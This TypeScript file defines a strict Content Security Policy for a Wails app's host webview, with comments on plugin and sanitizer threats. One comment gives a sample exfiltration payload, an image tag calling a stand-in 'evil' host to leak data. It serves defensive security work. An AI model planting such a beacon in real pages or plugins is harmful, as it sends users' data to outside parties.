// Content Security Policy for the host webview (#237, F2).
//
// The plugin-surface iframe has its own strict CSP (plugin-surface-csp.ts);
// the host webview — where every plugin's index.js runs as a blob: ESM and
// where every note is rendered through TipTap — had none prior to F2. The
// host CSP is the defense-in-depth backstop against:
//
//   - Plugin data exfiltration via <img src="https://evil/?leak">, fetch,
//     WebSocket, EventSource, or any other browser-side network primitive
//     (connect-src is the only browser-enforced gate).
//   - A future TipTap / @html sanitizer regression that lets user markdown
//     emit inline <script> (script-src blocks it).
//
// Shared between index.html (injection) and host-csp.test.ts (assertion)
// so the test catches drift instead of asserting on a duplicated string.

// Wails IPC + connect-src: Wails v2 IPC is browser-internal
// (window.chrome.webview.postMessage on WebView2,
// window.webkit.messageHandlers.* on WebKit/WebKitGTK). It is NOT an HTTP
// fetch and is therefore NOT subject to connect-src. The /wails/ipc.js and
// /wails/runtime.js scripts are same-origin. `connect-src 'self'` is
// sufficient and tighter than an ipc:// or ipc.localhost allowlist.

export const HOST_CSP =
  "default-src 'self'; " +
  "script-src 'self' 'wasm-unsafe-eval' blob:; " +
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data: blob:; " +
  "font-src 'self' data:; " +
  "connect-src 'self'; " +
  "frame-src 'self' blob:; " +
  "worker-src 'self' blob:; " +
  "object-src 'none'; " +
  "base-uri 'none'; " +
  "form-action 'none'; " +
  "frame-ancestors 'none'"

export const HOST_CSP_META = `<meta http-equiv="Content-Security-Policy" content="${HOST_CSP}">`
